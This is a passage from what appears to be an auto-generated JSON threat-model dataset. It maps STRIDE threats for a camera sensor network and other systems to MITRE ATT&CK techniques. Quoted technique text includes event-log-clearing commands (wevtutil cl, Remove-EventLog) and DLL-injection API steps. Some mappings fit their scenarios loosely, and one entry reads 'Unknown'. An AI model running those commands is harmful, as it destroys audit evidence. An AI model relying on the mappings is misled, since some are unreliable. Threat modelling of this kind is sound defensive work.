                    "Assumption": "Administrator credentials are obtained via phishing, social engineering, or other means.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials are available."
                },
                {
                    "Assumption": "The system does not enforce strict privilege separation and monitoring.",
                    "Role": "Application",
                    "Condition": "Weak privilege management controls are in place."
                },
                {
                    "Assumption": "The attacker has the ability to utilize the credentials effectively.",
                    "Role": "Attacker",
                    "Condition": "Attacker can impersonate the administrator."
                }
            ],
            "Potential Impact": "Complete control over the system and unrestricted data access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "compromised credentials",
                "administrative access",
                "system takeover"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting application vulnerabilities to inject malicious code and escalate privileges to perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The application contains code injection vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Unpatched code injection flaws are present."
                },
                {
                    "Assumption": "The attacker can deliver payloads to the vulnerable application component.",
                    "Role": "Attacker",
                    "Condition": "Attacker can reach and exploit vulnerable components."
                },
                {
                    "Assumption": "Proper input validation and sanitization measures are not in place.",
                    "Role": "Application",
                    "Condition": "Lack of adequate input validation."
                }
            ],
            "Potential Impact": "Gain elevated privileges, leading to unauthorized control of the system and data compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "unauthorized actions",
                "payload delivery"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a camera node to gain unauthorized access to the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes do not use strong authentication methods.",
                    "Role": "Attacker",
                    "Condition": "IF the node does not verify identities strongly."
                },
                {
                    "Assumption": "Network traffic is not encrypted or only weakly encrypted.",
                    "Role": "Attacker",
                    "Condition": "IF the network transmits unencrypted credentials or weakly encrypted data."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data and potential network disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "IoT",
                "device"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a compromised device to send fake data to the network.",
            "Assumptions": [
                {
                    "Assumption": "Compromised device is not detected promptly.",
                    "Role": "Attacker",
                    "Condition": "IF the compromised device goes unnoticed by network monitoring."
                },
                {
                    "Assumption": "Attackers can introduce rogue devices into the network.",
                    "Role": "Attacker",
                    "Condition": "IF there is a lack of physical and network access controls."
                }
            ],
            "Potential Impact": "Corruption of network data integrity and potential loss of data trustworthiness.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data injection",
                "network",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Man-in-the-middle (MitM) attacker could intercept and alter data transmitted between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Use of insecure communication protocols.",
                    "Role": "Attacker",
                    "Condition": "IF the network uses protocols vulnerable to MitM attacks."
                },
                {
                    "Assumption": "Lack of strong mutual authentication.",
                    "Role": "Attacker",
                    "Condition": "IF the communication setup does not enforce mutual authentication."
                }
            ],
            "Potential Impact": "Unauthorized modification and disclosure of visual data, leading to potential misinformation.",
            "MITRE ATT&CK Keywords": [
                "MitM",
                "network",
                "data alteration",
                "communication interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker exploits a vulnerability to tamper with the firmware of camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable firmware version is in use.",
                    "Role": "Attacker",
                    "Condition": "IF the devices are not updated to the latest secure firmware."
                },
                {
                    "Assumption": "Physical access to devices is not restricted.",
                    "Role": "Attacker",
                    "Condition": "IF attackers can physically interact with the devices."
                }
            ],
            "Potential Impact": "Corruption of camera operations and potential loss of data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers could alter configuration files on the central server to redirect visual data to unauthorized locations.",
            "Assumptions": [
                {
                    "Assumption": "Server configuration files are not adequately protected.",
                    "Role": "Attacker",
                    "Condition": "IF file permissions and access controls are lax."
                },
                {
                    "Assumption": "Administrators are not monitoring file integrity.",
                    "Role": "Attacker",
                    "Condition": "IF integrity verification mechanisms are not in place."
                }
            ],
            "Potential Impact": "Redirection of sensitive data leading to unauthorized disclosure and potential data leaks.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration files",
                "server",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actor exploits input validation vulnerability to execute arbitrary commands on the IoT application.",
            "Assumptions": [
                {
                    "Assumption": "Application does not validate inputs correctly.",
                    "Role": "Attacker",
                    "Condition": "IF input data is not sanitized or validated."
                },
                {
                    "Assumption": "Attackers have network access to the application endpoints.",
                    "Role": "Attacker",
                    "Condition": "IF endpoint access is not restricted."
                }
            ],
            "Potential Impact": "Execution of unauthorized commands affecting data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "input validation",
                "command injection",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny performing actions that were actually taken in the visual sensor network due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are disabled or poorly implemented.",
                    "Role": "User",
                    "Condition": "IF the system does not maintain comprehensive logs."
                },
                {
                    "Assumption": "Logs are not securely stored and protected.",
                    "Role": "User",
                    "Condition": "IF log files can be easily altered or deleted."
                }
            ],
            "Potential Impact": "Inability to track and verify user actions leading to audit and forensic challenges.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trails",
                "forensic"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unauthorized changes made to system configurations without proper logging of actions.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not audited.",
                    "Role": "Attacker",
                    "Condition": "IF there is no automated configuration change tracking."
                },
                {
                    "Assumption": "System lacks real-time alerting for changes.",
                    "Role": "Attacker",
                    "Condition": "IF system does not have alert mechanisms for changes."
                }
            ],
            "Potential Impact": "Inability to detect, recover, or verify changes leading to compromised system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "system configurations",
                "auditing",
                "real-time alerts"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Transaction logs can be modified to erase traces of malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "System allows direct access to transaction logs.",
                    "Role": "Attacker",
                    "Condition": "IF logs are not securely stored."
                },
                {
                    "Assumption": "Logging does not use integrity checks.",
                    "Role": "Attacker",
                    "Condition": "IF logs do not support integrity verification methods."
                }
            ],
            "Potential Impact": "Loss of evidence for detecting and investigating malicious activities resulting in compromised security posture.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "transaction logs",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Visual data intercepted during transmission due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "IF the system uses unencrypted communication channels."
                },
                {
                    "Assumption": "Network is accessible to unauthorized individuals.",
                    "Role": "Attacker",
                    "Condition": "IF network security is weak."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data, leading to privacy breaches and potential misuse of data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive configuration files exposed due to improper access controls.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive files are not adequately protected.",
                    "Role": "Attacker",
                    "Condition": "IF file access permissions are not correctly set."
                },
                {
                    "Assumption": "System lacks proper role-based access control mechanisms.",
                    "Role": "Attacker",
                    "Condition": "IF there is no differentiation of access based on roles."
                }
            ],
            "Potential Impact": "Exposure of critical system information aiding further attacks and data compromise.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "configuration files",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Visual data stored on local devices could be extracted by unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Local storage is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "IF devices store data in unencrypted formats."
                },
                {
                    "Assumption": "Devices lack physical security controls.",
                    "Role": "Attacker",
                    "Condition": "IF attackers can physically access the devices."
                }
            ],
            "Potential Impact": "Unauthorized access to stored visual data leading to privacy violations and potential data leaks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "local storage",
                "encryption",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targeting the VSN network infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure is not resilient to DDoS attacks.",
                    "Role": "Attacker",
                    "Condition": "IF network lacks DDoS protection mechanisms."
                },
                {
                    "Assumption": "Attack detection and mitigation response is slow.",
                    "Role": "Attacker",
                    "Condition": "IF there is a delay in responding to attack detections."
                }
            ],
            "Potential Impact": "Disruption of data capture and transmission leading to a temporary loss of service.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting software vulnerabilities to crash application services, affecting the VSN operations.",
            "Assumptions": [
                {
                    "Assumption": "Application contains exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "IF application code is not regularly patched or updated."
                },
                {
                    "Assumption": "System lacks robust error handling.",
                    "Role": "Attacker",
                    "Condition": "IF the application does not effectively handle unexpected inputs."
                }
            ],
            "Potential Impact": "Service outages and interruption in visual data processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerabilities",
                "application",
                "crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion by flooding the system with superfluous data requests.",
            "Assumptions": [
                {
                    "Assumption": "System does not have rate-limiting controls.",
                    "Role": "Attacker",
                    "Condition": "IF the system allows unlimited data requests without checks."
                },
                {
                    "Assumption": "System resources are limited.",
                    "Role": "Attacker",
                    "Condition": "IF the system cannot scale resources quickly."
                }
            ],
            "Potential Impact": "Degradation of system performance leading to potential service interruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "data flooding",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a privilege escalation vulnerability to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "System has known privilege escalation vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "IF the system is not patched to fix known issues."
                },
